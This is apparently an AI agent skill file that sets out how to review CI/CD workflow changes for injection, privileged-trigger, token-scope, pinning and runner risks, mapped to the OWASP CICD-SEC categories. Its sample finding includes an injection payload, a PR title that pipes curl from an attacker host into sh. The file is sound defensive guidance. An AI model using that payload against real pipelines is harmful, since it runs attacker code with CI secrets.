# CI Workflow Review

Review the **pending changes on the current branch** that touch CI/CD pipeline
configuration — GitHub Actions workflows, GitLab CI, Jenkins, and similar — for
the ways a pipeline can be hijacked or made to leak credentials. Findings are
classified against the
[OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
(CICD-SEC-1–10). The concrete patterns come from GitHub's
[secure use reference](https://docs.github.com/en/actions/reference/security/secure-use),
[script injections](https://docs.github.com/en/actions/concepts/security/script-injections),
and [securely using `pull_request_target`](https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target)
guidance, and GitLab's [pipeline security](https://docs.gitlab.com/ci/pipeline_security/),
[CI/CD variable security](https://docs.gitlab.com/ci/variables/#cicd-variable-security),
[merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/),
[CI/CD job token](https://docs.gitlab.com/ci/jobs/ci_job_token/), and
[runner security](https://docs.gitlab.com/runner/security/) guidance; the
CICD-SEC categories apply to any CI system.

Pipeline config is code that runs with credentials. Treat every value an
outside contributor can influence — MR/PR titles and bodies, branch names,
commit messages, author names, issue text — as attacker-controlled input that
may reach a shell only as quoted data, never as code. Exploitability hinges
on **who can trigger the pipeline** and **what the job can reach**: establish
both before judging severity.

The checklist below names both GitHub and GitLab mechanics for each pattern;
map them to whatever CI system the diff actually uses (the injection,
token-scope, pinning, and runner-isolation concerns are universal even where
the syntax differs).

## Scope

1. Determine the diff: `git fetch`, then `git diff origin/<base>...HEAD`
   (default base: `main`/`master`; with no remote, the local base), plus
   uncommitted changes (`git diff HEAD`) and untracked files
   (`git ls-files --others --exclude-standard`; read them whole). If you are
   already on the base branch, review the uncommitted changes instead.
2. Focus on pipeline files: `.github/workflows/*`, action definitions
   (`action.yml`), reusable workflows, `.gitlab-ci.yml`, `Jenkinsfile`,
   `azure-pipelines.yml`, `.circleci/`, Buildkite/Tekton configs.
3. Read the whole workflow around each hunk, not just the diff — triggers,
   token permissions, and secrets interact across the file, and a guard may
   sit outside the changed lines.
4. For each changed job, establish the trigger surface: can a fork MR/PR, an
   issue event, or an unauthenticated actor cause it to run, and with which
   token and secrets? On GitLab, note whether the job runs on a protected
   branch/tag (so protected variables and runners are in reach) or in a merge
   request pipeline — which for a fork MR runs in the fork project unless a
   parent-project member starts it in the parent.
5. This skill owns pipeline config, including its secrets and pins; the
   packages a build installs belong to `dependency-review` and the
   infrastructure it applies to `iac-review`. If the owner runs in the same
   review, leave its area to it; in a combined report, give each defect once,
   under the owner's classifier.

## What to look for (by CICD-SEC category)

### Poisoned pipeline execution & injection (CICD-SEC-4, CICD-SEC-1)

- **Untrusted interpolation into scripts** — the two systems differ, so judge
  by the one the diff uses:
  - GitHub: `${{ }}` expressions are substituted into the generated script
    *before* the shell runs, so `${{ github.event.pull_request.title }}`,
    `.body`, `head_ref`, commit messages, or author names inside `run:`
    become shell code. Fix: route the value through `env:` and reference it
    quoted (`"$TITLE"`), or pass it to an action as an input.
  - GitLab: CI/CD variables reach the job as environment variables, and the
    shell expands them in `script:`
    ([where variables can be used](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/))
    once — command substitution inside the value is not run, and a quoted
    `"$CI_MERGE_REQUEST_TITLE"` is not split or globbed. The sinks are
    **re-evaluation** — any command that parses its argument as code:
    `eval`, `sh -c "… $VAR"`, `bash -c`, an `ssh` command line, interpreter
    one-liners (`python -c`, `node -e`, `perl -e`, `ruby -e`, `awk` program
    text), or SQL for `psql -c`/`mysql -e`; quoting for the outer shell does
    not stop the inner parser from running the value; **argument
    injection** — a value that starts with `-` is read as an option even when
    quoted, and an unquoted `$VAR` is also split and globbed into several
    arguments
    ([OWASP command injection defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html),
    [SC2086](https://github.com/koalaman/shellcheck/wiki/SC2086)); and
    **generated files** — the value written into a script that is later
    sourced or run, or into a
    [`dotenv` report](https://docs.gitlab.com/ci/variables/dotenv_variables/),
    where a newline starts another `KEY=value` entry and dotenv entries
    override job `variables:` in later jobs. Untrusted sources are the MR
    title, description, and source branch (`$CI_MERGE_REQUEST_*`,
    `$CI_COMMIT_REF_NAME`) and commit text (`$CI_COMMIT_MESSAGE`, `_TITLE`,
    `_AUTHOR`). A merge carries them onto protected branches: the default
    [merge commit template](https://docs.gitlab.com/user/project/merge_requests/commit_templates/)
    titles the commit `Merge branch '<source branch>' into '<target>'` and
    copies the MR title into its message, and the default squash commit
    message is the MR title — so a protected-branch pipeline after a merge
    carries an outside contributor's text next to protected variables. Fix (the
    GitHub `env:` indirection does not apply — the value is already an
    environment variable): quote every expansion and put it after `--` or
    attach it to its option (`--title="$VAR"`) so it cannot become an
    option; drop the `eval`/`sh -c` or pass the value as a positional
    parameter (`sh -c 'notify "$1"' _ "$CI_COMMIT_TITLE"`); have an inner
    interpreter read the value as data (`os.environ`, `process.env`, stdin)
    instead of splicing it into program text; and use `$CI_COMMIT_REF_SLUG`
    or an allow-list check where only an identifier is needed.
- **Privileged trigger + untrusted code** — GitHub: `pull_request_target`
  with a checkout of the PR head
  (`ref: ${{ github.event.pull_request.head.sha }}`, `refs/pull/<n>/merge`,
  or `repository:` set to the fork), or a `workflow_run` job that checks out
  the triggering run's commit
  (`ref: ${{ github.event.workflow_run.head_sha }}`, or its `head_branch`
  from `workflow_run.head_repository`), then builds, tests, or installs from
  it — attacker code runs with secrets and a write token. Artifacts a
  `workflow_run` job downloads from that run are untrusted data too.
  `allow-unsafe-pr-checkout: true` switches off `actions/checkout`'s guard
  against fork PR refs; treat it as this finding unless the checkout is only
  read. GitLab: a fork MR pipeline runs in the fork project by default, with
  the fork's own variables and runners, and protected variables and runners
  reach only protected refs (MR pipelines only when both branches are
  protected, in the same project, and the project opts in). The exposure is a
  pipeline run *in the parent project* for a fork MR — started by a parent
  member, with no warning when triggered through the API or `/rebase` — which
  executes the fork's `.gitlab-ci.yml` with the parent's non-protected
  variables and runners. Flag secrets stored as non-protected variables and
  privileged or deploy-capable runners not limited to protected refs:
  whoever gets such a pipeline started can reach them.
- Executing files an outside contributor can modify (build scripts, Makefiles,
  `package.json` lifecycle hooks) inside a privileged job.
- Deploy or release jobs newly reachable without a required review,
  environment protection rule, or protected-branch/tag gate (insufficient
  flow control).

### Credential hygiene & token scope (CICD-SEC-6, CICD-SEC-5, CICD-SEC-2)

- Over-broad automatic token. GitHub: missing or broadened `permissions:` —
  set `permissions: contents: read` at the top and raise per-job only as
  needed. GitLab: `CI_JOB_TOKEN` cross-project access left wide — keep the
  target project's job-token allowlist enabled and minimal; a disabled
  allowlist lets a pipeline in any project use a leaked token against this one.
- Secrets in plaintext in the pipeline file; secrets passed as command-line
  arguments (visible in logs and process lists); derived/transformed secrets
  that will not be masked; a whole JSON credential blob where one field is
  needed. GitLab: CI/CD variables that should be **masked** and **protected**
  (restricted to protected branches/tags) but are not — a non-protected
  variable reaches every branch and MR pipeline, including a parent-project
  pipeline for a fork MR.
- Secrets or privileged runners newly exposed to jobs that fork MRs/PRs can
  trigger.
- Long-lived cloud keys stored as secrets where short-lived OIDC federation
  (GitHub OIDC, GitLab ID tokens) is available.

### Third-party steps (CICD-SEC-3, CICD-SEC-8)

- Third-party build blocks referenced by **mutable tag or branch** instead of
  a pinned commit SHA — the only immutable reference; a compromised one sees
  every secret its job gets. GitHub: `uses: some/action@v3` / `@main`. GitLab:
  a project `include:` or CI/CD component with no `ref`/version or pinned to a
  branch or tag (pin a commit SHA; a protected tag is enough only in a project
  your own org controls, since that project's maintainers can
  [delete and recreate](https://docs.gitlab.com/user/project/protected_tags/)
  it), or a `remote:` URL include (vendor a reviewed copy and
  `include: local`); also a container `image:` pinned by tag rather than
  `@sha256:` digest, or assembled from a variable.
- New third-party steps, reusable workflows, or `include:`d config from outside
  the org with no provenance check.

### Artifacts, caches & runners (CICD-SEC-9, CICD-SEC-7)

- Artifacts produced by an untrusted run consumed by a privileged job without
  validation; caches writable from fork MRs/PRs feeding privileged builds
  (cache poisoning).
- Runners exposed to untrusted jobs. GitHub: self-hosted runners on
  public-repo or fork-PR workloads. GitLab: a **privileged Docker executor**
  or docker-in-docker (root on the runner host), or a **shell executor**, on a
  shared/non-ephemeral runner that also runs untrusted or fork-MR jobs — one
  job can steal another's `CI_JOB_TOKEN` and source. Prefer ephemeral,
  non-privileged runners; restrict privileged/DinD runners to protected
  branches.
- Secrets or credentials resident on the runner image.
- `continue-on-error:`/`allow_failure: true` added to a security check; debug
  flags that echo secrets or the environment into logs (also CICD-SEC-10).

## Output

Report each finding as a single list item:

- **[severity] CICD-SEC category** — `file:line`
  **Issue:** who can trigger it, what they control, and what they gain.
  **Fix:** the concrete change (GitHub: move the expression into `env:`;
  GitLab: drop the `eval`/`sh -c` and quote the variable; drop the privileged
  trigger, pin the SHA, scope the token).

Rate `severity` on the shared severity rubric, impact × likelihood:
**critical** — high impact (code execution, auth bypass, stolen credentials or
bulk data, data loss, an outage), readily triggered (by anyone who can reach
it, or in routine operation); **high** — high impact behind a common
precondition (an authenticated user, a collaborator, a routine failure), or
medium impact (limited exposure, degraded service) readily triggered;
**medium** — high impact only under an unusual precondition, medium impact
behind a common one, or low impact readily triggered (a weakened defense
anyone can reach); **low** — medium impact only under an unusual
precondition, or low impact behind any precondition (most defense in depth
and hygiene).
Here: **critical** — an outside contributor can run code with secrets or a
write token (script injection in a fork-triggerable workflow or a
protected-branch job, `pull_request_target` + head checkout), or a live secret
sits in pipeline config or is printed to job output others can read (the Fix
must also
[revoke and rotate](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
it); **high** — an over-broad token, or secrets exposed to more jobs or
triggers than need them; **medium** — a mutable pin (a tag, branch, or image
tag instead of a commit SHA or digest, classified
`CICD-SEC-3 Dependency Chain Abuse`), or a hardening gap only collaborators can
exploit. The classifier is the CICD-SEC category (e.g.
`CICD-SEC-4 Poisoned Pipeline Execution`). Order findings by severity, highest
first, keeping one issue per finding. For example:

- **[critical] CICD-SEC-4 Poisoned Pipeline Execution** — `.github/workflows/greet.yml:14`
  **Issue:** `run: echo "Thanks for ${{ github.event.pull_request.title }}"`
  expands the attacker-controlled PR title directly into bash in a workflow
  fork PRs can trigger — a title like `"; curl https://evil.sh | sh` executes
  arbitrary code with the job's token.
  **Fix:** pass the title via `env:` (`TITLE: ${{ github.event.pull_request.title }}`)
  and reference it quoted (`"$TITLE"`).

Verify before reporting: check the changed job's actual trigger and
`permissions` before calling something exploitable — the same interpolation is
critical under a fork-triggerable event and low in a manually dispatched
maintainer job — quote the offending line in the Issue, and drop anything
without a concrete attacker path. Prefer the few findings that matter; if more
than ~10 survive, report the ones worth a human's time and summarize the rest
in a line.

Open the report with one line stating what was reviewed and the outcome, e.g.
`Reviewed origin/main...HEAD (2 workflows): 1 finding, critical.` If the diff
touches no pipeline configuration, say so and stop. If the pipeline changes
are sound, say so explicitly rather than manufacturing findings.
